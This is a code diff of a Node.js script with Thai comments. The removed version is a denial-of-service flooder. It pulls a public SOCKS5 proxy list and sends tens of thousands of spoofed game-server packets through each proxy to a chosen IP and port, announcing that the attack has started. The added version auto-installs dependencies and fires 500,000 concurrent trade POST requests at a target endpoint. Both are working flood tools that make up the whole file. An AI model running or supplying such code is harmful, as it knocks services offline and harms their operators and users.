@@ -1,88 +1,59 @@
-const axios = require('axios');
-const { SocksProxyAgent } = require('socks-proxy-agent');
-const net = require('net');
+const { execSync } = require('child_process');
 
-// ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
+// ฟังก์ชันตรวจสอบและติดตั้งโมดูล
+function ensureModule(module) {
+    try {
+        require.resolve(module);
+    } catch (e) {
+        console.log(`กำลังติดตั้งโมดูล: ${module} ...`);
+        execSync(`npm install ${module}`, { stdio: 'inherit' });
+    }
+}
+
+// ตรวจสอบและติดตั้งโมดูลที่จำเป็น
+ensureModule('axios');
+
+const axios = require('axios');
+
+// ฟังก์ชันสำหรับส่งคำขอเทรด
+async function sendTradeRequest(ip, port, tradeId) {
+    const url = `http://${ip}:${port}/trade`; // เปลี่ยน URL ตามที่คุณต้องการ
+    const tradeData = {
+        id: tradeId,
+        amount: 1000, // ตัวอย่างจำนวนเงินที่ต้องการเทรด
+    };
+
+    try {
+        const response = await axios.post(url, tradeData);
+        console.log(`Trade ${tradeId} ส่งสำเร็จ:`, response.data);
+    } catch (error) {
+        console.error(`Trade ${tradeId} ส่งไม่สำเร็จ:`, error.message);
+    }
+}
+
+// ฟังก์ชันสำหรับส่งเทรด 500,000 ครั้ง
+async function sendBulkTrades(ip, port, totalTrades) {
+    const promises = [];
+
+    for (let i = 1; i <= totalTrades; i++) {
+        promises.push(sendTradeRequest(ip, port, i));
+    }
+
+    // รอให้ทุกคำขอส่งเสร็จ
+    await Promise.all(promises);
+    console.log(`ส่ง ${totalTrades} เทรดเสร็จสิ้น`);
+}
+
+// รับ IP และ PORT จากคำสั่ง
 const args = process.argv.slice(2);
-if (args.length < 2) {
-    console.log("Usage: node main.js <IP> <PORT>");
+if (args.length !== 2) {
+    console.error('โปรดระบุ IP และ PORT เช่น: node main.js <IP> <PORT>');
     process.exit(1);
 }
 
 const ip = args[0];
 const port = args[1];
-const orgip = ip;
+const totalTrades = 500000; // จำนวนเทรดที่ต้องการส่ง
 
-// ข้อมูลแพ็กเก็ตในรูปแบบ Hexadecimal
-const packets = [
-    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'),
-    Buffer.from('53414d509538e1a9611e63', 'hex'),
-    Buffer.from('53414d509538e1a9611e69', 'hex'),
-    Buffer.from('53414d509538e1a9611e72', 'hex'),
-    Buffer.from('081e62da', 'hex'),
-    Buffer.from('081e77da', 'hex'),
-    Buffer.from('081e4dda', 'hex'),
-    Buffer.from('021efd40', 'hex'),
-    Buffer.from('021efd40', 'hex'),
-    Buffer.from('081e7eda', 'hex')
-];
-
-console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);
-
-// ดาวน์โหลด proxy list
-async function getProxies() {
-    const response = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
-    return response.data.split('\n').filter(Boolean);
-}
-
-// ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
-async function sendPackets(proxy) {
-    try {
-        const agent = new SocksProxyAgent(`socks5://${proxy}`);
-        const options = {
-            host: ip,
-            port: port,
-            agent: agent
-        };
-
-        const socket = net.connect(options, () => {
-            for (let i = 0; i < 50000; i++) {  // เปลี่ยนจาก 90000 เป็น 50000
-                const msg = packets[Math.floor(Math.random() * packets.length)];
-                socket.write(msg);
-
-                if (port == 7777) {
-                    socket.write(packets[5]);
-                } else if (port == 7796) {
-                    socket.write(packets[4]);
-                } else if (port == 7771) {
-                    socket.write(packets[6]);
-                } else if (port == 7784) {
-                    socket.write(packets[7]);
-                } else if (port == 1111) {
-                    socket.write(packets[9]);
-                }
-            }
-            socket.end();
-        });
-
-        socket.on('error', (err) => {
-            console.error(`Error with proxy ${proxy}: ${err.message}`);
-        });
-
-    } catch (error) {
-        console.error(`Failed to connect through proxy ${proxy}: ${error.message}`);
-    }
-}
-
-// ฟังก์ชันหลัก
-async function startAttack() {
-    const proxies = await getProxies();
-    setInterval(() => {
-        proxies.forEach(proxy => {
-            sendPackets(proxy);
-        });
-    }, 10000); // ส่ง request ทุก 1 วินาที
-}
-
-// เริ่มการทำงาน
-startAttack();
+// เริ่มต้นส่งเทรด
+sendBulkTrades(ip, port, totalTrades);
